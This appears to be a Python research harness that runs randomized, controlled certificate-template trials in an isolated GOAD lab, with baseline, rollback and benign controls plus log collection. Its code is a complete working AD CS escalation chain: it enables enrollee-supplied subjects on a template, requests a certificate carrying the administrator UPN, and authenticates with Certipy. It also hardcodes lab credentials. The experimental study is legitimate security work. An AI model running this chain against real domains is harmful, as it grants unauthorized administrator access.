"""Controlled paired enrollment interventions in the user's isolated GOAD copies.

Freeze the protocol before execution. Each trial uses a new CSR/certificate,
restores the captured template flags, preserves failed attempts, and labels
outcomes from certificate bytes plus CA/KDC evidence, independently of CIPG.
No original VM image or real organization endpoint is modified.
"""

import argparse
import base64
from datetime import datetime, timezone
import hashlib
import importlib.metadata
import json
import os
from pathlib import Path
import random
import re
import subprocess
import tempfile
import time
import xml.etree.ElementTree as ET

import winrm
from asn1crypto.core import UTF8String
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs12, NoEncryption

from scripts.capture_trace7_split_actor_delayed_pkinit import (
    get_current_event_record_id, export_events_since, pull_file_winrm, verify_pfx_certificate,
)

ROOT = Path(__file__).resolve().parents[3]
TEMPLATE = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,"


def digest(path):
    return hashlib.sha256(path.read_bytes()).hexdigest()


def dump(path, value):
    path.write_text(json.dumps(value, indent=2, sort_keys=True)+"\n")


def freeze(path, repeats):
    if path.exists():
        raise FileExistsError(path)
    trials = []
    for repeat in range(repeats):
        conditions = ["baseline_admin_san", "enabled_admin_san", "rollback_before_enroll", "benign_self_enrollment"]
        random.Random(17021+repeat).shuffle(conditions)
        for condition in conditions:
            trials.append({"id": f"r{repeat+1:02d}_{condition}", "condition": condition,
                           "requested_upn": "viserys.targaryen@essos.local" if condition == "benign_self_enrollment" else "administrator@essos.local",
                           "expected_admin_certificate": condition == "enabled_admin_san"})
    sources = [Path(__file__), ROOT/"scripts/capture_trace7_split_actor_delayed_pkinit.py"]
    protocol = {"declared_utc": datetime.now(timezone.utc).isoformat(), "schema": 1,
                "scope": "Controlled single-configuration repeated policy interventions, not enterprise prevalence or cross-version generalization",
                "original_name_flag_required": 33554432, "intervention": "Set only enrollee-supplied-subject bit via original | 1",
                "cache_control": "Restart CertSvc after the assigned state, identically across all conditions",
                "trials": trials, "source_sha256": {str(p.relative_to(ROOT)): digest(p) for p in sources},
                "labels": "Public certificate SAN, matching 4887 request and successful 4768 certificate/target SID; infrastructure errors are not negatives"}
    path.parent.mkdir(parents=True, exist_ok=True)
    dump(path, protocol)


class Runner:
    def __init__(self, args, output):
        self.args, self.output = args, output
        def session(url, user, password):
            return winrm.Session(url, auth=(user, password), transport="ntlm", read_timeout_sec=60, operation_timeout_sec=50)
        self.dc = session(args.dc_url, os.environ.get("GOAD_DC_USER", "ESSOS\\vagrant"), os.environ.get("GOAD_DC_PASSWORD", "vagrant"))
        self.ca = session(args.ca_url, os.environ.get("GOAD_CA_USER", "BRAAVOS\\vagrant"), os.environ.get("GOAD_CA_PASSWORD", "vagrant"))
        self.mutator = session(args.dc_url, "khal.drogo@essos.local", os.environ.get("GOAD_KHAL_PASSWORD", "horse"))
        self.enroller = session(args.dc_url, "viserys.targaryen@essos.local", os.environ.get("GOAD_VISERYS_PASSWORD", "GoldCrown"))
        self.submitter = session(args.ca_url, "viserys.targaryen@essos.local", os.environ.get("GOAD_VISERYS_PASSWORD", "GoldCrown"))

    def ps(self, session, name, script, required=True):
        start, mono = time.time(), time.monotonic_ns()
        result = session.run_ps("$ErrorActionPreference='Stop'\n"+script)
        row = {"host_before": start, "host_after": time.time(), "host_monotonic_elapsed_ns": time.monotonic_ns()-mono,
               "returncode": result.status_code, "stdout": result.std_out.decode("utf-8-sig", errors="replace"),
               "stderr": result.std_err.decode("utf-8-sig", errors="replace")}
        dump(self.output/(name+".json"), row)
        if required and result.status_code:
            raise RuntimeError("Failed phase: "+name)
        return row

    def state(self, name):
        row = self.ps(self.dc, name, "$nc=(Get-ADRootDSE).configurationNamingContext; $t=Get-ADObject -Identity ('"+TEMPLATE+"'+$nc) -Properties *; @{name_flag=[int]$t.'msPKI-Certificate-Name-Flag';dn=$t.DistinguishedName;template_oid=$t.'msPKI-Cert-Template-OID';enrollment_flag=$t.'msPKI-Enrollment-Flag';eku=$t.pKIExtendedKeyUsage} | ConvertTo-Json -Depth 6 -Compress")
        return json.loads(row["stdout"])

    def set_flag(self, name, value):
        return self.ps(self.mutator, name, "$nc=(Get-ADRootDSE).configurationNamingContext; Set-ADObject -Identity ('"+TEMPLATE+"'+$nc) -Replace @{'msPKI-Certificate-Name-Flag'="+str(value)+"}; 'WRITE_COMPLETE'")

    def push(self, session, raw, remote, phase):
        # Keep each encoded command below WinRM's command-line envelope.
        encoded = base64.b64encode(raw).decode()
        self.ps(session, phase+"_init", f"[IO.File]::WriteAllText('{remote}.b64','')")
        for index in range(0, len(encoded), 1800):
            self.ps(session, phase+f"_part{index//1800}", f"[IO.File]::AppendAllText('{remote}.b64','{encoded[index:index+1800]}')")
        self.ps(session, phase+"_decode", f"[IO.File]::WriteAllBytes('{remote}',[Convert]::FromBase64String([IO.File]::ReadAllText('{remote}.b64'))); Remove-Item '{remote}.b64'")
        if pull_file_winrm(session, remote) != raw:
            raise ValueError("Transferred bytes differ")

    def inventory(self):
        script = """$d=Get-ADDomain; $v=Get-ADUser viserys.targaryen -Properties userPrincipalName; $a=Get-ADUser Administrator -Properties userPrincipalName; $os=Get-CimInstance Win32_OperatingSystem; @{domain_sid=$d.DomainSID.Value;dns_root=$d.DNSRoot;viserys_sid=$v.SID.Value;admin_sid=$a.SID.Value;computer=$env:COMPUTERNAME;os=$os.Caption;build=$os.BuildNumber;utc=[DateTime]::UtcNow.ToString('o')} | ConvertTo-Json -Compress"""
        context = json.loads(self.ps(self.dc, "00_domain_context", script)["stdout"])
        self.ps(self.ca, "00_ca_inventory", "$o=Get-CimInstance Win32_OperatingSystem; @{computer=$env:COMPUTERNAME;os=$o.Caption;build=$o.BuildNumber;certsvc=(Get-Service CertSvc).Status.ToString();utc=[DateTime]::UtcNow.ToString('o')} | ConvertTo-Json -Compress")
        return context

    def certipy_find(self, phase):
        destination = self.output/phase
        destination.mkdir()
        command = [self.args.certipy, "find", "-u", "viserys.targaryen@essos.local", "-p", os.environ.get("GOAD_VISERYS_PASSWORD", "GoldCrown"),
                   "-dc-ip", self.args.ldap_ip, "-target-ip", self.args.ldap_ip, "-dc-host", "meereen.essos.local",
                   "-ldap-scheme", "ldap", "-ldap-port", str(self.args.ldap_port), "-dc-only", "-json", "-text", "-output", "certipy", "-timeout", "10"]
        start = time.perf_counter()
        result = subprocess.run(command, cwd=destination, capture_output=True, text=True, timeout=150)
        command[command.index("-p")+1] = "<environment>"
        dump(destination/"execution.json", {"command": command, "returncode": result.returncode, "elapsed_seconds": time.perf_counter()-start,
            "stdout": result.stdout, "stderr": result.stderr, "scope": "Actual Certipy 5.0.4 DC-only LDAP assessment; CA runtime configuration is outside this scan"})
        if result.returncode:
            raise RuntimeError("Certipy enumeration failed")

    def run_trial(self, trial, original):
        self.output.mkdir(exist_ok=False)
        result = {"id": trial["id"], "condition": trial["condition"], "status": "started", "restored": False}
        dc_start = ca_start = None
        stem = "q1_"+trial["id"]
        remote = "C:\\Shared\\"+stem
        try:
            context = self.inventory()
            before = self.state("01_before_state")
            if before["name_flag"] != original:
                raise RuntimeError("The preceding trial did not restore the baseline")
            dc_start = get_current_event_record_id(self.dc)
            ca_start = get_current_event_record_id(self.ca)
            condition = trial["condition"]
            if condition in ("enabled_admin_san", "benign_self_enrollment", "rollback_before_enroll"):
                self.set_flag("02_enable_subject", original | 1)
            if condition == "rollback_before_enroll":
                self.set_flag("03_rollback_before_enroll", original)
            assigned = self.state("04_assigned_state")
            expected_flag = original | 1 if condition in ("enabled_admin_san", "benign_self_enrollment") else original
            if assigned["name_flag"] != expected_flag:
                raise RuntimeError("Intervention did not produce the assigned state")
            self.ps(self.ca, "05_controlled_cache_refresh", "Restart-Service CertSvc -Force; (Get-Service CertSvc).WaitForStatus('Running',[TimeSpan]::FromSeconds(30)); 'CA_RUNNING'")
            self.certipy_find("06_certipy_find")
            inf = '[NewRequest]\nSubject = "CN=viserys.targaryen"\nKeyLength = 2048\nExportable = TRUE\nMachineKeySet = FALSE\n[Extensions]\n2.5.29.17 = "{text}upn='+trial["requested_upn"]+'"\n[RequestAttributes]\nCertificateTemplate = "CGPubPositive"\n'
            self.ps(self.enroller, "07_csr", f"[IO.File]::WriteAllText('{remote}.inf',@'\n{inf}'@); $p=Start-Process certreq.exe -ArgumentList '-new -q -f {remote}.inf {remote}.req' -Wait -PassThru -NoNewWindow; if($p.ExitCode -ne 0){{throw ('CSR_EXIT:'+ $p.ExitCode)}}")
            self.push(self.ca, pull_file_winrm(self.dc, remote+".req"), remote+".req", "08_csr_transfer")
            submission = self.ps(self.submitter, "09_submission", f"$p=Start-Process certreq.exe -ArgumentList '-submit -q -f -config \"braavos.essos.local\\CertGraph-Lab-CA\" {remote}.req {remote}.cer' -Wait -PassThru -NoNewWindow; Write-Output ('SUBMIT_EXIT:'+ $p.ExitCode); Write-Output ('CER_EXISTS:'+ (Test-Path '{remote}.cer'))")
            code = re.search(r"SUBMIT_EXIT:(-?\d+)", submission["stdout"])
            if not code:
                raise RuntimeError("No native certreq outcome")
            result["native_submission_exit"] = int(code.group(1))
            if int(code.group(1)) != 0 or "CER_EXISTS:True" not in submission["stdout"]:
                result["status"] = "ca_nonissuance_requires_adjudication"
                return result
            certificate_bytes = pull_file_winrm(self.ca, remote+".cer")
            (self.output/"issued_certificate.cer").write_bytes(certificate_bytes)
            self.push(self.dc, certificate_bytes, remote+".cer", "10_certificate_transfer")
            if condition in ("enabled_admin_san", "benign_self_enrollment"):
                self.set_flag("11_rollback_after_issue", original)
            export = f"""$p=Start-Process certreq.exe -ArgumentList '-accept -user -q {remote}.cer' -Wait -PassThru -NoNewWindow
if($p.ExitCode -ne 0){{throw 'ACCEPT_FAILED'}}
$issued=New-Object Security.Cryptography.X509Certificates.X509Certificate2('{remote}.cer')
$cert=Get-Item ('Cert:\\CurrentUser\\My\\'+$issued.Thumbprint)
if(-not $cert.HasPrivateKey){{throw 'NO_EXACT_PRIVATE_KEY'}}
if([Convert]::ToBase64String($cert.RawData) -ne [Convert]::ToBase64String($issued.RawData)){{throw 'BYTES_DIFFER'}}
$pwd=ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Export-PfxCertificate -Cert $cert -FilePath '{remote}.pfx' -Password $pwd | Out-Null
'EXACT_PFX_EXPORTED'"""
            self.ps(self.enroller, "12_exact_pfx", export)
            key, cert, chain = verify_pfx_certificate(pull_file_winrm(self.dc, remote+".pfx"), certificate_bytes)
            upns = []
            try:
                for entry in cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value:
                    if isinstance(entry, x509.OtherName) and entry.type_id.dotted_string == "1.3.6.1.4.1.311.20.2.3":
                        upns.append(UTF8String.load(entry.value).native)
            except x509.ExtensionNotFound:
                pass
            identity = {"serial": format(cert.serial_number,"x"), "sha1": cert.fingerprint(hashes.SHA1()).hex(),
                        "sha256": cert.fingerprint(hashes.SHA256()).hex(), "upns": upns, "issuer": cert.issuer.rfc4514_string()}
            dump(self.output/"certificate_identity.json", identity)
            chosen_user = "administrator" if condition == "enabled_admin_san" else "viserys.targaryen"
            expected_sid = context["admin_sid"] if chosen_user == "administrator" else context["viserys_sid"]
            with tempfile.TemporaryDirectory(prefix="goad-q1-private-") as directory:
                pfx = Path(directory)/"issued.pfx"
                raw = pkcs12.serialize_key_and_certificates(b"auth",key,cert,chain,NoEncryption())
                descriptor = os.open(pfx,os.O_CREAT|os.O_EXCL|os.O_WRONLY,0o600)
                with os.fdopen(descriptor,"wb") as target:
                    target.write(raw)
                command = [self.args.certipy,"auth","-pfx",str(pfx),"-dc-ip",self.args.auth_ip,"-username",chosen_user,"-domain","essos.local","-no-hash","-no-save"]
                start = time.monotonic_ns()
                auth = subprocess.run(command,cwd=directory,capture_output=True,text=True,timeout=90)
                dump(self.output/"13_certipy_auth.json", {"returncode": auth.returncode,"stdout": auth.stdout,"stderr":auth.stderr,"elapsed_ns":time.monotonic_ns()-start,
                    "scope":"Diagnostic only: exact certificate and KDC evidence determine successful outcome"})
            result.update(status="issued_auth_attempted", certificate_identity=identity, expected_auth_sid=expected_sid,
                          privileged_san_present="administrator@essos.local" in [s.casefold() for s in upns])
        except Exception as error:
            result.update(status="infrastructure_error", error=type(error).__name__+": "+str(error))
        finally:
            try:
                self.set_flag("99_restore_flag",original)
                final = self.state("99_final_state")
                result["restored"] = final["name_flag"] == original
                self.ps(self.dc,"99_remove_private_export",f"Remove-Item '{remote}.pfx' -ErrorAction SilentlyContinue")
                time.sleep(2)
                if dc_start is not None and ca_start is not None:
                    fragments = []
                    for session,boundary,ids in ((self.dc,dc_start,(5136,4768,4624,4616)),(self.ca,ca_start,(4886,4887,4888,4898,4899,4616))):
                        raw = export_events_since(session,boundary,ids)
                        if raw:
                            fragments.extend(list(ET.fromstring("<Events>"+raw+"</Events>")))
                    tree = ET.Element("Events")
                    tree.extend(fragments)
                    ET.ElementTree(tree).write(self.output/"events.xml",encoding="utf-8",xml_declaration=True)
                    self.ps(self.ca,"99_ca_bridge", "$r=certutil -view -restrict 'Disposition=20' -out 'RequestID,RequesterName,SerialNumber,CertificateHash,CertificateTemplate' csv; $r")
            except Exception as error:
                result["cleanup_error"] = type(error).__name__+": "+str(error)
            dump(self.output/"outcome.json",result)
            dump(self.output/"manifest.json",{str(p.relative_to(self.output)):digest(p) for p in sorted(self.output.rglob("*")) if p.is_file() and p.name!="manifest.json"})
        return result


def run(args):
    protocol = json.loads(args.protocol.read_text())
    for name,expected in protocol["source_sha256"].items():
        if digest(ROOT/name) != expected:
            raise ValueError("Frozen source changed: "+name)
    args.output.mkdir(parents=True,exist_ok=False)
    dump(args.output/"protocol.json",protocol)
    snapshots=args.output/"sources"; snapshots.mkdir()
    for name in protocol["source_sha256"]:
        (snapshots/Path(name).name).write_bytes((ROOT/name).read_bytes())
    version=subprocess.run([args.certipy,"-v"],capture_output=True,text=True,check=True)
    dump(args.output/"tool_versions.json",{"certipy":(version.stdout+version.stderr).strip(),
        "python":__import__("sys").version,"winrm":importlib.metadata.version("pywinrm"),
        "cryptography":importlib.metadata.version("cryptography"),
        "dc_url":args.dc_url,"ca_url":args.ca_url,"ldap_ip":args.ldap_ip,"ldap_port":args.ldap_port})
    runner=Runner(args,args.output)
    initial=runner.state("00_initial_state")
    original=initial["name_flag"]
    if original != protocol["original_name_flag_required"]:
        raise ValueError("Unexpected baseline; no mutation attempted")
    result=[]
    for trial in protocol["trials"]:
        runner.output=args.output/trial["id"]
        outcome=runner.run_trial(trial,original)
        result.append(outcome)
        dump(args.output/"progress.json",result)
        print(json.dumps({k:outcome.get(k) for k in ("id","status","restored","privileged_san_present","error")}),flush=True)
        if not outcome["restored"] or outcome["status"]=="infrastructure_error":
            break  # Do not run dependent trials after an unreviewed failure.
    dump(args.output/"run_manifest.json",{"protocol_sha256":digest(args.protocol),"trials_attempted":len(result),"trials_planned":len(protocol["trials"]),
         "scope":protocol["scope"],"private_keys_persisted":False})


if __name__ == "__main__":
    parser=argparse.ArgumentParser();sub=parser.add_subparsers(dest="action",required=True)
    f=sub.add_parser("freeze");f.add_argument("protocol",type=Path);f.add_argument("--repeats",type=int,default=3)
    r=sub.add_parser("run");r.add_argument("protocol",type=Path);r.add_argument("output",type=Path)
    r.add_argument("--dc-url",required=True);r.add_argument("--ca-url",required=True);r.add_argument("--certipy",required=True)
    r.add_argument("--ldap-ip",required=True);r.add_argument("--ldap-port",type=int,default=1389);r.add_argument("--auth-ip",default="127.0.0.2")
    args=parser.parse_args()
    if args.action=="freeze":
        if args.repeats<1:parser.error("Positive repetitions required")
        freeze(args.protocol,args.repeats)
    else:run(args)
